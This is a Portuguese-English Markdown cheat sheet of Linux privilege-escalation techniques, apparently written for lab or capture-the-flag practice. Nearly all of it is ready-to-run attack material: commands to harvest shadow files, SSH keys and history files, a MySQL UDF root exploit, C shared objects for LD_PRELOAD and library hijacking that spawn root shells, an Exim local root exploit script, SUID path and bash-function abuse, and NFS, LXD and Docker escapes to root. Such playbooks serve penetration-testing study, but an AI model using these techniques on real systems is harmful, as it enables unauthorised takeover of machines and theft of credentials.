<!-- TOC -->

- [1. Sair da Jaula! Upgrade e estabilizar o shell](#1-sair-da-jaula-upgrade-e-estabilizar-o-shell)
- [2. Basic commands](#2-basic-commands)
	- [2.1. info sobre a distribuição, versão, kernel](#21-info-sobre-a-distribuição-versão-kernel)
	- [2.2. info sobre as variáveis de ambiente](#22-info-sobre-as-variáveis-de-ambiente)
	- [2.3. Aplicações e serviços](#23-aplicações-e-serviços)
	- [2.4. Crontabs](#24-crontabs)
	- [2.5. nome de usuário ou senhas em texto simples?](#25-nome-de-usuário-ou-senhas-em-texto-simples)
	- [2.6. rede](#26-rede)
	- [2.7. Users e passwords](#27-users-e-passwords)
	- [2.8. Permissões de arquivos e executáveis](#28-permissões-de-arquivos-e-executáveis)
	- [2.9. Capabilities - setcap / getcap / setuid](#29-capabilities-setcap-getcap-setuid)
	- [2.10. Logs...](#210-logs)
	- [2.11. Sistemas de arquivos montados](#211-sistemas-de-arquivos-montados)
- [3. Service Exploits](#3-service-exploits)
	- [3.1. Se MySQL service rodar com privilégios root:](#31-se-mysql-service-rodar-com-privilégios-root)
- [4. Weak File Permissions](#4-weak-file-permissions)
	- [4.1. Weak File Permissions - If readable /etc/shadow...](#41-weak-file-permissions-if-readable-etcshadow)
	- [4.2. Weak File Permissions - If writable /etc/shadow](#42-weak-file-permissions-if-writable-etcshadow)
	- [4.3. Weak File Permissions - If writable /etc/passwd](#43-weak-file-permissions-if-writable-etcpasswd)
- [5. Sudo - Shell Escape Sequences](#5-sudo-shell-escape-sequences)
	- [5.1. Sudo - Variáveis de Ambiente](#51-sudo-variáveis-de-ambiente)
- [6. SUID / SGID Executables](#6-suid-sgid-executables)
	- [6.1. SUID / SGID Executables - Known Exploits](#61-suid-sgid-executables-known-exploits)
	- [6.2. SUID / SGID Executables - Shared Object Injection](#62-suid-sgid-executables-shared-object-injection)
	- [6.3. SUID / SGID Executables - Environment Variables](#63-suid-sgid-executables-environment-variables)
	- [6.4. SUID / SGID Executables ​​- Abusando de Recursos do Shell](#64-suid-sgid-executables-​​-abusando-de-recursos-do-shell)
- [7. Senhas e chaves](#7-senhas-e-chaves)
	- [7.1. Senhas e chaves - Arquivos de histórico](#71-senhas-e-chaves-arquivos-de-histórico)
	- [7.2. Senhas e chaves - Arquivos de configurações](#72-senhas-e-chaves-arquivos-de-configurações)
	- [7.3. senhas e chaves - chaves SSH](#73-senhas-e-chaves-chaves-ssh)
- [8. NFS exports - NFS no_root_squash](#8-nfs-exports-nfs-no_root_squash)
- [9. LXD Group](#9-lxd-group)
- [10. Dockers Group](#10-dockers-group)
- [11. PrivEsc - Kernel Exploits](#11-privesc-kernel-exploits)

<!-- /TOC -->

# 1. Linux Privilege Escalation

---

## 1. Sair da Jaula! Upgrade e estabilizar o shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'  # OR
/usr/bin/script -qc /bin/bash /dev/null         # OR
script /dev/null -c bash
export TERM=xterm
export SHELL=bash

# Ctrl + Z
stty raw -echo; fg; reset
stty rows 40 columns 170
```

---

## 2. Basic commands

---

### 2.1. info sobre a distribuição, versão, kernel

```bash
cat /etc/*-release
cat /etc/issue

cat /proc/version
uname -a
uname -mrs
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz-
```

---

### 2.2. info sobre as variáveis de ambiente

```bash
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
env
set

```

---

### 2.3. Aplicações e serviços

```bash
ps aux
ps -ef
top
cat /etc/services

ps aux | grep root
ps -ef | grep root

ls -alh /usr/bin/
ls -alh /sbin/
dpkg -l
rpm -qa
ls -alh /var/cache/apt/archivesO
ls -alh /var/cache/yum/

cat /etc/syslog.conf
cat /etc/chttp.conf
cat /etc/lighttpd.conf
cat /etc/cups/cupsd.conf
cat /etc/inetd.conf
cat /etc/apache2/apache2.conf
cat /etc/my.conf
cat /etc/httpd/conf/httpd.conf
cat /opt/lampp/etc/httpd.conf
ls -aRl /etc/ | awk '$1 ~ /^.*r.*/'
```

---

### 2.4. Crontabs

```bash
/dev/shm  # comparável ao c:\windows\temp
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```

```bash
# Check Diferents Processes running
----------------------------------------------
#!/bin/bash

old=$(ps -eo command)

echo -e "Start at: $(date +%H:%M:%S)"
while true; do
		echo -ne "Now: $(date +%H:%M:%S)\r"
		new=$(ps -eo command)
		diff <(echo "$old") <(echo "$new") | grep "[\<\>]" | grep -vE "croncheck.sh|command"
		old=$new
done
```

---

### 2.5. nome de usuário ou senhas em texto simples?

```bash
grep -i user [filename]
grep -i pass [filename]
grep -C 5 "password" [filename]
find / -name "*php" -type f -print0 2>/dev/null | xargs -0 grep -i -n -E "pass|user" | grep -vE ":.*//|:.*\*"
```

---

### 2.6. rede

```bash
cat /proc/net/tcp
for b in $(cat /proc/net/tcp | grep -v "rem_add" | tr ':' ' ' | awk '{print $3}' | sort -u); do python3 -c "print("0x$b")"; done
cat /proc/net/fib_trie
cat /etc/knockd.conf


/sbin/ifconfig -a
cat /etc/network/interfaces
cat /etc/sysconfig/network

cat /etc/resolv.conf
cat /etc/sysconfig/network
cat /etc/networks
iptables -L
hostname
dnsdomainname

lsof -i
lsof -i :80
grep 80 /etc/services
netstat -antup
netstat -antpx
netstat -tulpn
chkconfig --list
chkconfig --list | grep 3:on
last
w

arp -e
route
/sbin/route -nee

tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21 # tcpdump tcp dst [ip] [porta] e tcp dst [ip] [porta]

```

---

### 2.7. Users e passwords

```bash
id
who
w
last
cat /etc/passwd | cut -d: -f1    # List of users
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # List of super users
awk -F: '($3 == "0") {print}' /etc/passwd   # List of super users
cat /etc/sudoers
sudo -l

cat /etc/passwd
cat /etc/group
cat /etc/shadow
ls -alh /var/mail/

ls -ahlR /root/
ls -ahlR /home/

cat /var/apache2/config.inc
cat /var/lib/mysql/mysql/user.MYD
cat /root/anaconda-ks.cfg

cat ~/.bash_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history

cat ~/.bashrc
cat ~/.profile
cat /var/mail/root
cat /var/spool/mail/root

cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key
```

---

### 2.8. Permissões de arquivos e executáveis

```bash
find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done

# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null

find / -writable -type d 2>/dev/null      # world-writeable folders
find / -perm -222 -type d 2>/dev/null     # world-writeable folders
find / -perm -o w -type d 2>/dev/null     # world-writeable folders
find / -perm -o x -type d 2>/dev/null     # world-executable folders
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders

find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files

ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone
ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null | grep -vE "^l|^d"
ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null       # Owner
ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Group
ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null        # Other
ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null | grep -vE "^l|^d"


find /etc/ -readable -type f 2>/dev/null               # Anyone
find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone
```

---

### 2.9. Capabilities - setcap / getcap / setuid

```bash
getcap -r / 2>/dev/null               # python with that can easily convert user to root.
									  # import os; os.setuid(0), os.system("/bin/bash")
setcap cap_setuid+ep /path/to/binary  # set uid for scale faster praticaly invisible!
```

---

### 2.10. Logs...

```bash
ls -alh /var/log
ls -alh /var/mail
ls -alh /var/spool
ls -alh /var/spool/lpd
ls -alh /var/lib/pgsql
ls -alh /var/lib/mysql
cat /var/lib/dhcp3/dhclient.leases

ls -alhR /var/www/
ls -alhR /srv/www/htdocs/
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/
ls -alhR /var/www/html/

cat /etc/httpd/logs/access.log
cat /etc/httpd/logs/error.log
cat /var/log/apache2/access.log
cat /var/log/apache2/error.log
cat /var/log/apache/access.log
cat /var/log/auth.log
cat /var/log/chttp.log
cat /var/log/cups/error_log
cat /var/log/dpkg.log
cat /var/log/faillog
cat /var/log/httpd/access.log
cat /var/log/httpd/error.log
cat /var/log/lastlog
cat /var/log/lighttpd/access.log
cat /var/log/lighttpd/error.log
cat /var/log/lighttpd/lighttpd.access.log
cat /var/log/lighttpd/lighttpd.error.log
cat /var/log/messages
cat /var/log/secure
cat /var/log/syslog
cat /var/log/wtmp
cat /var/log/xferlog
cat /var/log/yum.log
cat /var/run/utmp
cat /var/webmin/miniserv.log
cat /var/www/logs/access_log
cat /var/www/logs/access.log
ls -alh /var/lib/dhcp3/
ls -alh /var/log/postgresql/
ls -alh /var/log/proftpd/
ls -alh /var/log/samba/
```

---

### 2.11. Sistemas de arquivos montados

```bash
mount
df -h

cat /etc/fstab
```

<div style="page-break-after: always;"></div>

## 3. Service Exploits

### 3.1. Se MySQL service rodar com privilégios root:

O site https://www.exploit-db.com/exploits/1518 contem o código necessário à criação do ficheiro raptor_udf2.c

```bash
cd /home/user/tools/mysql-udf
nano raptor_udf2.c             # Colocar neste novo ficheiro o código do site acima indicado
gcc -g -c raptor_udf2.c -fPIC  # Compila o raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

-   Conectar-se ao MySQL service enquanto **root**

```bash
mysql -u root
```

-   Usar os seguintes comandos no MySQL shell para criar User Defined Function (UDF) "do_system":

```sql
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select \* from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
	# Usar a função para copiar o bash para tmp/rootbash e dar a respectiva "SUID permission"
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
	# Sair do MySQL shell
exit
```

-   Executar o novo bash **root**:

```bash
/tmp/rootbash -p
```

<div style="page-break-after: always;"></div>

## 4. Weak File Permissions

### 4.1. Weak File Permissions - If readable /etc/shadow...

```bash
ls -l /etc/shadow
cat /etc/shadow
kali@kali: > john --wordlist=/usr/share/wordlists/rockyou.txt hash
sudo su
```

---

### 4.2. Weak File Permissions - If writable /etc/shadow

```bash
ls -l /etc/shadow
mkpasswd -m sha-512 password123  # Apenas apresenta um hash referente á password123
nano /etc/shadow  # substituir hash do root pela nossa nova hash, e gravar (Ctrl+o, Enter)
su root
```

---

### 4.3. Weak File Permissions - If writable /etc/passwd

O arquivo /etc/passwd contém informações sobre contas de usuário. É legível por todos, mas normalmente só pode ser escrito pelo usuário root. Historicamente, o arquivo /etc/passwd continha hashes de senha de usuário, e algumas versões do Linux ainda permitem que hashes de senha sejam armazenados lá.

```bash
ls -l /etc/passwd  # Verificamos se o ficheiro pode ser escrito
openssl passwd novaPasswordAqui
nano /etc/passwd  # (substituindo o "x") colocar nova hash, e gravar (Ctrl+o, Enter)
su root
```

---

#### Alternativa

-   copie a linha do usuário root e anexe-a ao final do arquivo, alterando _root_ para _newroot_, e colocando o hash no respectivo lugar...

```bash
# newroot:qTC1yraDLAqfc:0:0:root:/root:/bin/bash     => pass:test
su newroot
```

<div style="page-break-after: always;"></div>

## 5. Sudo - Shell Escape Sequences

```bash
sudo -l  # verificar lista dos programas que podem ser usados para elevar privilégios: https://gtfobins.github.io/
```

---

### 5.1. Sudo - Variáveis de Ambiente

LD_PRELOAD e LD_LIBRARY_PATH são ambos herdados do ambiente do usuário. LD_PRELOAD carrega um objeto compartilhado antes de qualquer outro quando um programa é executado. LD_LIBRARY_PATH fornece uma lista de diretórios onde as bibliotecas compartilhadas são pesquisadas primeiro.

```bash
sudo -l # Este comando lista os programas que o sudo permite que o usuário execute
```

Sudo pode ser configurado para herdar certas variáveis ​​de ambiente do ambiente do usuário.

---

#### Sudo - Variáveis de Ambiente - LD_PRELOAD

-   Criar o ficheiro /home/user/tools/sudo/preload.c

```bash
mkdir /home/user/tools/sudo/
touch /home/user/tools/sudo/preload.c
nano /home/user/tools/sudo/preload.c
```

-   copiar o código abaixo, gravar (Ctrl+o) e sair (Ctrl+x)

```c
#include​ <stdio.h>
#include​ <sys/types.h>
#include​ <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/sh");
	}
```

-   Compilar

```bash
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```

-   Execute um dos programas com permissões administrativas via sudo, previamente listados, enquanto define a variável de ambiente LD_PRELOAD para o caminho completo do novo objeto compartilhado:

```bash
sudo LD_PRELOAD=/tmp/preload.so nomeDoProgramaComPermissõesSudo
```

---

#### Sudo - Variáveis de Ambiente - LD_LIBRARY_PATH

-   Execute ldd no arquivo de programa com permissões sudo (exemplo para toda a secção: apache2) para ver quais bibliotecas compartilhadas são usadas pelo programa:

```bash
which apache2
ldd /usr/sbin/apache2
```

-   Crie um objeto compartilhado com o mesmo nome de uma das bibliotecas listadas (exemplo: libcrypt.so.1, do apache2) usando o seguinte código:

```bash
mkdir /home/user/tools/sudo/
touch /home/user/tools/sudo/library_path.c
nano /home/user/tools/sudo/library_path.c
```

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
		unsetenv("LD_LIBRARY_PATH");
		setresuid(0,0,0);
		system("/bin/bash -p");
}
```

-   Complilar

```bash
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```

-   Executar o apache2 usando sudo, com a variável de ambiente LD_LIBRARY_PATH nova (que ficou localizado em /tmp):

```bash
sudo LD_LIBRARY_PATH=/tmp apache2
```

<div style="page-break-after: always;"></div>

## 6. SUID / SGID Executables

### 6.1. SUID / SGID Executables - Known Exploits

-   Encontre todas as aplicações SUID/SGID executáveis

```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

A título de exemplo, o programa /usr/sbin/exim-4.84-3 aparece nos resultado... Efetuar pesquisa no https://www.exploit-db.com/, ou simplesmente google, ou github.

-   Criar um ficheiro e copiar o código da pesquisa, neste caso:

```bash
touch exploit.sh
nano exploit.sh
```

```bash
#!/bin/sh

echo [ CVE-2016-1531 local root exploit
cat > /tmp/root.pm << EOF
package root;
use strict;
use warnings;

system("/bin/sh");
EOF
PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps
```

-   Grave o ficheiro (Ctrl+o), tornar o mesmo num executável e executar

```bash
chmod +x exploit.sh
./exploit.sh
```

---

### 6.2. SUID / SGID Executables - Shared Object Injection

-   Encontre todas as aplicações SUID/SGID executáveis

```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

Existem programas que usam objectos partilhados. Neste exemplo, assumimos que encontramos um /usr/local/bin/suid-so.

-   O comando strace permite rastrear os objectos partilhados de um programa. Adicionamos uns filtros

```bash
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```

Neste caso, assumimos que, num directory que tenhamos acesso (/home/user/),o ficheiro /home/user/.config/libcalc.so não se encontra

-   Criar directory e o ficheiro em falta

```bash
mkdir /home/user/.config
cd /home/user/.config
touch libcalc.c
nano libcalc.c
```

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
		setuid(0);
		system("/bin/bash -p");
}
```

-   Gravar (Ctrl+o), e compilar:

```bash
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
```

-   Executar o suid-so para ganhar shell root

```bash
/usr/local/bin/suid-so
```

---

### 6.3. SUID / SGID Executables - Environment Variables

-   Encontre todas as aplicações SUID/SGID executáveis

```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

Neste exemplo, assumimos que existe um /usr/local/bin/suid-env executável, e que pode ser explorado por herdar a variável de ambiente PATH do usuário e tentar executar programas sem especificar um caminho absoluto.

-   Primeiro, execute o arquivo e observe que ele parece estar tentando iniciar o servidor da web apache2:

```bash
/usr/local/bin/suid-env
```

-   Execute strings no arquivo para procurar strings de caracteres imprimíveis:

```bash
strings /usr/local/bin/suid-env
```

Uma linha ("service apache2 start") sugere que o do serviço executável está sendo chamado para iniciar o servidor web, porém o caminho completo do executável (/usr/sbin/service) não está sendo usado.

Podemos explorá-lo criando um script com o seguinte conteúdo, e de nome service.c:

```c
int main() {
		setuid(0);
		system("/bin/bash -p");
}
```

-   Compliar:

```bash
gcc -o service ./service.c
```

Anexe o diretório atual (ou onde o novo executável do serviço está localizado) à variável PATH e execute o suid-env executável para obter um shell raiz:

```bash
PATH=.:$PATH /usr/local/bin/suid-env
```

---

### 6.4. SUID / SGID Executables ​​- Abusando de Recursos do Shell

#### Para bash --version inferior a 4.2-148

-   Encontre todas as aplicações SUID/SGID executáveis

```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

Neste exemplo, assumimos que existe o mesmo /usr/local/bin/suid-env executável, mas desta vez, usaram um caminho absoluto para executar o serviço /usr/sbin/service para iniciar o servidor web apache2, e podemos saber isso graças ao seguinte comando:

```bash
strings /usr/local/bin/suid-env
```

Nas versões Bash <4.2-048 , é possível definir funções de shell com nomes que se assemelham a caminhos de arquivo e, em seguida, exportar essas funções para que sejam usadas em vez de qualquer executável real nesse caminho de arquivo.

-   verificar se o Bash instalado é inferior a 4.2-048

```bash
/bin/bash --version
```

-   Criação da função que irá executar o shell root, exportação da mesma, e execução do serviço para obtenção do shell root:

```bash
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service

/usr/local/bin/suid-env
```

#### Para bash --version superior a 4.4

Quando o bash usa o modo de depuração, usa variáveis de ambiente PS4, podendo assim criar arquivos através de um programa com privilégios root que o usuário tem permissões para executar. Ainda com o exemplo /usr/local/bin/suid-env

```bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
```

-   Executar o novo rootbash com opção -p para obter um shell root:

```bash
/tmp/rootbash -p
```

<div style="page-break-after: always;"></div>

## 7. Senhas e chaves

### 7.1. Senhas e chaves - Arquivos de histórico

Se um usuário digitar acidentalmente a sua senha na linha de comando em vez de escrevê-lo um prompt de senha, ela pode ficar registada no histórico...

-   Visualize o conteúdo de todos os arquivos de histórico ocultos no diretório inicial do usuário (ser fino!!):

```bsah
cat ~/.*history | less
```

### 7.2. Senhas e chaves - Arquivos de configurações

-   Exemplo:

```bash
ls /home/user
cat /home/user/myvpn.ovpn
```

### 7.3. senhas e chaves - chaves SSH

-   Exemplo de arquivos ocultos:

```bash
ls -la /
ls -l /.ssh
```

Nesta pasta é comum existir chaves ssh mal protegidas... Exemplo com um possível arquivo root_key:

-   copiar a chave toda directamente para a minha **KALI-LINUX** e dar as permições adequadas (para não ser bloqueado pela maquina alvo), e entrar via ssh:

```bash
chmod 600 root_key
ssh -i root_key root@10.10.10.10
```

<div style="page-break-after: always;"></div>

## 8. NFS exports - NFS no_root_squash

```bash
[+] NFS exports?
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
/home/james *(rw,fsid=0,sync,no_root_squash,insecure)
```

> We have an NFS mount! But we didn’t see NFS anywhere on the nmap scan! This tells us that the port is probably behind a firewall. A quick google search tells us that fsid=0 means that we are using NFSv4 here. This is good, as we only have 1 port to worry about.

-   Forwarding all the ports!
    -   Google also tells us that NFSv4 uses port 2049. So let’s forward that port locally.

```bash
ssh -fNL 2049:localhost:2049 -i id_rsa $USER@$TARGET_IP  # Local kali machine
```

-   Mount up
    -   First we’ll create a mount point and then mount the drive. There’s a small hitch in that we’ll mount using localhost, as we’re forwarding that port over.

```bash
# Local kali machine
mkdir mnt
sudo mount -t nfs4 localhost:/ mnt
# entering into our mount point, we can see files!
cd mnt
```

-   The no_root_squash option that we saw earlier is also very interesting, It basically will allow files owned by root to keep their root privileges. Basically, your root is my root, and my root is your root.

-   Because we have root privileges on our attacker box, we can abuse this setting to add a sticky bit to something like bash and execute that as a user to gain root access to the target machine. Let’s see this in action.

```bash
# Local kali machine in mounted root path
cp /bin/bash .
sudo chown root:root ./bash
sudo chmod +s ./bash
# Give access to all users on the root directory
sudo chmod +rx .
```

> Now as the user on target machine , we should be able to enter on the directory and run our new bash with the -p option!

<div style="page-break-after: always;"></div>

## 9. LXD Group

```bash
kali@kali: > git clone https://github.com/saghul/lxd-alpine-builder.git
kali@kali: > cd rootfs/usr/share/
kali@kali: > sudo mkdir alpine-mirror
kali@kali: > cd alpine-mirrors
kali@kali: > sudo touch MIRRORS.txt
kali@kali: > sudo nano MIRRORS.txt
	http://alpine.mirror.wearetriple.com
kali@kali: > cd ../../../..
kali@kali: > chmod +x build-alpine
kali@kali: > sudo ./build-alpine  # Talvés seja perciso mais que uma vez
kali@kali: > sudo python3 -m http.server 80

target@10.10.10.10: > wget http://<kali ip>:80/<alpine-name.tar.gz>
target@10.10.10.10: > lxd init  # Enter all options
target@10.10.10.10: > lxc image import ./<alpine-name.tar.gz> --alias privesc
target@10.10.10.10: > lxc init privesc privesc-container -c security.privileged=true
target@10.10.10.10: > lxc config device add privesc-container mydevice disk source=/ path=/mnt/root recursive=true
target@10.10.10.10: > lxc start privesc-container
target@10.10.10.10: > lxc exec privesc-container /bin/sh

# Agora temos um shell root. No entanto, este shell é do container que está dentro do target machine, e as pastas da target machine estão montadas em /mnt/root/ desse container. Todos os ficheiros que são alterados dentro de /mnt/root/ e subdirectories serão alterados também na target machine mesmo.

```

## 10. Dockers Group
```bash
target@10.10.10.10: > docker images
target@10.10.10.10: > docker ps
target@10.10.10.10: > docker ps -a
target@10.10.10.10: > docker run --rm -dit --name privesc ubuntu  # Tem que existir uma imagem "ubuntu" na máquina...
target@10.10.10.10: > docker ps
target@10.10.10.10: > docker exec -it privesc /bin/bash
## Os processos acima apenas ligam um docker...

target@10.10.10.10: > docker run --rm -dit -v /:/mnt/root/ --name privesc ubuntu  # desta vez, montamos um directório "/mnt/root/" que contém uma cópia de todo o "/" da máquina principal
```



## 11. PrivEsc - Kernel Exploits

> Detection => linux-exploit-suggester.sh

```bash
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
```
